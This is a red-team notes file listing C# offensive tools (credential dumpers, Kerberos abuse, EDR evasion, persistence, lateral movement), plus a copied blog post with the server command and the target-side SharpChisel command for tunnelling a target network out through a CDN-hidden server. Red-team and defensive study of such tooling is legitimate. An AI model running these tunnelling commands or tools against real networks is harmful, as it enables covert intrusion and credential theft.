
##
#
https://github.com/Flangvik/SharpCollection
#
https://github.com/N7WEra/SharpAllTheThings
#
https://github.com/RedSiege/SharpCollectionTemplate
#
https://github.com/cube0x0/SharpSystemTriggers
#
https://github.com/matterpreter/OffensiveCSharp
#
https://github.com/boh/RedCsharp
#
https://github.com/S3cur3Th1sSh1t/PowerSharpPack
#
https://github.com/anthemtotheego/SharpExec
#
##


# Sharp
### Curated list of C# Offensive Tools

* [AsyncRAT](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)
  * Open-Source Remote Administration Tool For Windows C# (RAT)

* [Convenant](https://github.com/cobbr/Covenant)
  *  .NET c2 framework that serves as a collaborative command and control platform for red teamers.

* [GhostPack](https://github.com/GhostPack)
   * [SafetyKatz](https://github.com/GhostPack/SafetyKatz) - C# Loader for Mimikatz
   * [Rubeus](https://github.com/GhostPack/Rubeus) - C# toolset for raw Kerberos interaction and abuses
   * [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) - C# port of some Mimikatz DPAPI functionality 
   * [SharpWMI](https://github.com/GhostPack/SharpWMI) - C# implementation of various WMI functionality 
   * [SharpUp](https://github.com/GhostPack/SharpUp) - C# port of various PowerUp functionality
   * [Seatbelt](https://github.com/GhostPack/Seatbelt) - C# project that performs a number of security oriented host-survey "safety checks"
   * [SharpDump](https://github.com/GhostPack/SharpDump) - C# port of PowerSploit's Out-Minidump.ps1 functionality
   * [SharpRoast](https://github.com/GhostPack/SharpRoast) - C# port of various PowerView's Kerberoasting functionality

* [Reconerator](https://github.com/stufus/reconerator)
  * C# Targeted Attack Reconnissance Tools

* [SharpHound](https://github.com/BloodHoundAD/SharpHound)
  * The BloodHound C# Ingestor

* [SharPersist](https://github.com/fireeye/SharPersist)
  * Windows persistence toolkit written in C#
  
* [SharpRDP](https://github.com/0xthirteen/SharpRDP)
  * Remote Desktop Protocol .NET Console Application for Authenticated Command Execution

* [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
  * Payload Generation Framework

* [SharpSploit](https://github.com/cobbr/SharpSploit)
  * SharpSploit is a .NET post-exploitation library written in C#

* [SharpView](https://github.com/tevora-threat/SharpView)
  * C# implementation of harmj0y's PowerView

* [SharpWeb](https://github.com/djhohnstein/SharpWeb)
  * .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge.

* [Watson](https://github.com/rasta-mouse/Watson)
  * Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities

##
##
##

#
https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49
#

Red Team: Using SharpChisel to exfil internal network
Shantanu Khandelwal

Shantanu Khandelwal
·

Follow
5 min read
·
Jun 8, 2020

During many Red Team Assessment, we use multiple agents to connect to our target network infrastructure. These agents connect to different C2 servers such as Cobalt Strike, Metasploit Framework, Empire, SharpC2 (recent C2 Framework by
Rasta Mouse
), etc. One of the critical features of these C2 agents is to provide a tunnel to the target network. The latency to tunnels through these beacons or agents is quite high. Also, we generally have to make these agents interactive to make these tunnels work, which increases the risk of detection.

During my exploration of Golang, I was introduced to a very famous tool named as CHISEL. Working with CHISEL is quite unique. Chisel can provide tunnel access to the target network via WebSockets. Chisel is an open-source, fast TCP tunnel, transported over HTTP, secured via SSH.

One thing to note is that Chisel is a Golang application, which means it cannot be used with our current toolset such as CobaltStrike’s execute-assembly. In this post, I want to introduce SharpChisel. SharpChisel is a C# wrapper around Golang Chisel. In my previous post, I had discussed how to make a C# wrapper for Golang.

Using Chisel during Red Team assessment

Chisel has two components client and server. Chisel binary is complied in a way that provides both server and client functionality via a single file. In this post, I will discuss the usage of Chisel from a Red Team perspective.

Setting Up Chisel Server

Chisel’s pre-compiled binaries can be downloaded from here. Once the binary is downloaded, the server component can be run on one of your redirector.
```
./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"

================================================================server : run the Server Component of chisel 
-p 8080 : run server on port 8080
--key "private": use "private" string to seed the generation of a ECDSA public and private key pair
--auth "user:pass" : Creds required to connect to the server
--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.
```

Setting up CHISEL CDN: Hiding the Red Team Infrastructure

Since Chisel works on WebSockets, we will require a CDN/Proxy which supports WebSockets. A few CDN which come to mind are Heroku and Cloudfront. There are a few more, and I will leave that as an exercise for the reader to find other ways to hide the Chisel Server. Let’s set up Heroku, followed by CloudFront

Setting up Heroku as Proxy

It’s quite simple to set up Heroku as a proxy. Open this repo https://github.com/shantanu561993/heroku-reverse-proxy and click the deploy button.

Enter the details as per following screenshot and click Deploy app.

Your proxy will be created. An easy way to check if everything is working is to open <yourappname>.herokuapp.com and check you are presented with your proxy domain set up in server config. In my case it was google.com.

Done.

Setting up Cloudfront CDN

Cloudfront by default supports WebSockets, so there is no extra config required.

To start, log in to your AWS account, and from the services menu, pick CloudFront. Click “Create Distribution” and select the “Web” option and then follow the screenshots.

In 10 to 15 mins, your Cloudfront should be up and running. Opening the CloudFront URL will show the proxy domain. In my case as said previously, it was google.com
```
Running SharpChisel on Target Network

SharpChisel can be downloaded from https://github.com/shantanu561993/SharpChisel.

Following commands will be able to tunnel the target network to your chisel server

SharpChisel.exe client --auth user:pass https://d15i3ejqu7j95x.cloudfront.net R:1080:socks

```
Once the client is connected you will see a Socks5 port open on the server

You can now Local Port Forward this port (1080 in our case) to get access to the ex-filtrated network.

How to local port forward

SSH / Putty or any SSH client can do port forwarding.

Conclusion: SharpChisel is a C# wrapper around Chisel which can be used to tunnel or better said “ex-filtrate” network access from the target network.

If you have any issues understanding or using this project, reach out to me on Twitter or LinkedIn



Credits: Vincent Yiu, Chisel Dev Team, My Team and all others who continuously help me to improve and work tirelessly.





Credits

Links for all these amazing tools are below :) title @leechristensen

    ADCollector - C# tool to quickly extract valuable information from the Active Directory environment @dev-2null
    ADCSPwn - C# tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service. @bats3c
    ADSearch - C# tool to help query AD via the LDAP protocol @tomcarver16 (Only NET 4.7)
    ADFSDump - A C# tool to dump all sorts of goodies from AD FS. @FireEye
    AtYourService - C# .NET Assembly for Service Enumeration @mitchmoser
    BetterSafetyKatz - Fork of SafetyKatz dynamically fetches the latest Mimikatz, runtime patching signatures and PE loads Mimikatz into memory. @Flangvik
    Certify - C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS). @harmj0y @tifkin_
    EDD - Enumerate Domain Data is designed to be similar to PowerView but in .NET @FortyNorthSecurity
    ForgeCert - uses a stolen CA certificate + private key to forge certificates for arbitrary users. @tifkin_
    DeployPrinterNightmare - C# tool for installing a shared network printer abusing the PrinterNightmare bug to allow other network machines easy privesc @Flangvik
    Grouper2 - C# tool to help find security-related misconfigurations in Active Directory Group Policy. @mikeloss
    Group3r - C# tool to find vulnerabilities in AD Group Policy, but do it better than Grouper2 did. @mikeloss
    KrbRelay - C# Framework for Kerberos relaying @cube0x0
    KrbRelayUp - universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced @dec0ne
    LockLess - Allows for the copying of locked files. @GhostPack
    PassTheCert - Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannel. @AlmondOffSec
    PurpleSharp - C# adversary simulation tool that executes adversary techniques with the purpose of generating attack telemetry in monitored Windows environments. @mvelazc0
    Rubeus - C# toolset for raw Kerberos interaction and abuses. @GhostPack
    RunAs - Csharp and open version of windows builtin runas.exe. @splinter_code
    SafetyKatz - Combination of slightly modified version of @gentilkiwi's Mimikatz project and @subTee's .NET PE Loader. @GhostPack
    SauronEye - C# search tool find specific files containing specific keywords (.doc, .docx, .xls, .xlsx). @_vivami
    scout - A .NET assembly for performing recon against hosts on a network . @jaredhaight
    SearchOutlook - C# tool to search through a running instance of Outlook for keywords @RedLectroid
    Seatbelt - Performs a number of security oriented host-survey "safety checks". @GhostPack
    Sharp-SMBExec - A native C# conversion of Kevin Robertsons Invoke-SMBExec powershell script @checkymander
    SharpAllowedToAct - C# implementation of a computer object takeover through Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity) @pkb1s
    SharpAppLocker - C# port of the Get-AppLockerPolicy PS cmdlet with extended features @Flangvik
    SharpBlock - A method of bypassing EDR's active projection DLL's by preventing entry point exection. @CCob
    SharpBypassUAC - C# tool for UAC bypasses @rodzianko
    SharpChisel - C# Chisel Wrapper. @shantanu561993
    SharpChrome - Chrome-specific implementation of SharpDPAPI capable of cookies and logins decryption/triage. @GhostPack
    SharpChromium - C# Project to retrieve Chromium data, such as cookies, history and saved logins. @djhohnstein
    SharpCloud - Simple C# for checking for the existence of credential files related to AWS, Microsoft Azure, and Google Compute. @chrismaddalena
    SharpCrashEventLog - C# port of LogServiceCrash @slyd0g @limbenjamin
    SharpCOM - C# port of Invoke-DCOM @424f424f
    SharpDir - C# tool to search both local and remote file systems for files. @jnqpblc
    SharpDoor - C# tool to allow multiple RDP (Remote Desktop) sessions by patching termsrv.dll file. @infosecn1nja
    SharpDPAPI - C# port of some Mimikatz DPAPI functionality. @GhostPack
    SharpDump - SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality. @GhostPack
    SharpEDRChecker - C# tool to check for the presence of known defensive products such as AV's, EDR's and logging tools @PwnDexter
    SharPersist - C# persistence toolkit.
    SharpExec - SharpExec is an offensive security C# tool designed to aid with lateral movement. @anthemtotheego
    SharpFiles - C# tool to search for files based on SharpShares output. @fullmetalcache
    SharpGPOAbuse - SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO). @FSecureLABS
    SharpHandler - C# tool for stealing/duping handles to LSASS @Jean_Maes_1994
    SharpHose - Asynchronous Password Spraying Tool in C# for Windows Environments . @ustayready
    SharpHound - C# 2022 version of the BloodHound 4.x Ingestor. @BloodHoundAD
    SharpKatz - PURE C# port of significant MimiKatz functionality such as logonpasswords, dcsync, etc. @b4rtik
    SharpLaps - A C# tool to retrieve LAPS passwords from LDAP @pentest_swissky
    SharpMapExec - C# version of @byt3bl33d3r's tool CrackMapExec @cube0x0
    SharpMiniDump - C# tool to Create a minidump of the LSASS process from memory @b4rtik
    SharpNoPSExec - C# tool allowing file less command execution for lateral movement. @juliourena
    SharpMove - C# tool for performing lateral movement techniques @0xthirteen
    SharpPrinter - C# tool for discovering Printers on an network @424f424f
    SharpRDP - C# Remote Desktop Protocol Console Application for Authenticated Command Execution @0xthirteen
    SharpReg - C# tool to interact with the Remote Registry service api. @jnqpblc
    SharpSecDump - C# port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py @G0ldenGunSec
    SharpSCCM - C# utility for interacting with SCCM @_Mayyhem
    SharpShares - Enumerate all network shares in the current domain. @djhohnstein
    SharpSphere - C# SharpSphere has the ability to interact with the guest operating systems of virtual machines managed by vCenter. @jkcoote & @grzryc
    SharpSpray - C# tool to perform a password spraying attack against all users of a domain using LDAP. @jnqpblc
    SharpStay - .NET project for installing Persistence. @0xthirteen
    SharpSearch - C# Project to quickly filter through a file share for targeted files for desired information. @djhohnstein
    SharpSvc - C# tool to interact with the SC Manager API. @jnqpblc (Only NET 4.7)
    SharpSniper - SharpSniper is a simple tool to find the IP address of these users so that you can target their box. @hunniccyber
    SharpSQLPwn - C# tool to identify and exploit weaknesses within MSSQL instances in Active Directory environments. @lefayjey
    SharpTask - C# tool to interact with the Task Scheduler service api. @jnqpblc
    SharpUp - C# port of various PowerUp functionality. @GhostPack
    SharpView - C# implementation of harmj0y's PowerView. @tevora-threat
    SharpWMI - C# implementation of various WMI functionality. @GhostPack
    SharpWebServer - A Red Team oriented simple HTTP & WebDAV server written in C# with functionality to capture Net-NTLM hashes. @mariuszbit
    SharpWifiGrabber - Sharp Wifi Password Grabber retrieves in clear-text the Wi-Fi Passwords from all WLAN Profiles saved on a workstation. @r3n_hat
    SharpZeroLogon - C# port of CVE-2020-1472 , a.k.a. Zerologon. @buffaloverflow
    Shhmon - Neutering Sysmon via driver unload. @Shhmon
    Snaffler - C# tool for pentesters to help find delicious candy. @l0ss and @Sh3r4
    SqlClient - C# .NET mssql client for accessing database data through beacon. @FortyNorthSecurity
    StandIn - C# based small AD post-compromise toolkit. @FuzzySec
    StickyNotesExtract - C# tool that extracts data from the Windows Sticky Notes database. @V1V1
    SweetPotato - Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019 . @CCob
    ThunderFox - C# Retrieves data (contacts, emails, history, cookies and credentials) from Thunderbird and Firefox. @V1V1
    TruffleSnout - C# based iterative AD discovery toolkit for offensive operators. @dsnezhkov
    TokenStomp - C# implementation of the token privilege removal flaw discovered by @GabrielLandau / Elastic. @Mrtn9
    Watson - Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities . @rasta-mouse
    winPEAS - PEASS - Privilege Escalation Awesome Scripts (winPEAS). @carlospolop
    WMIReg - C# PoC to interact with local/remote registry hives through WMI. @airzero24
    Whisker - Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute. @elad_shamir
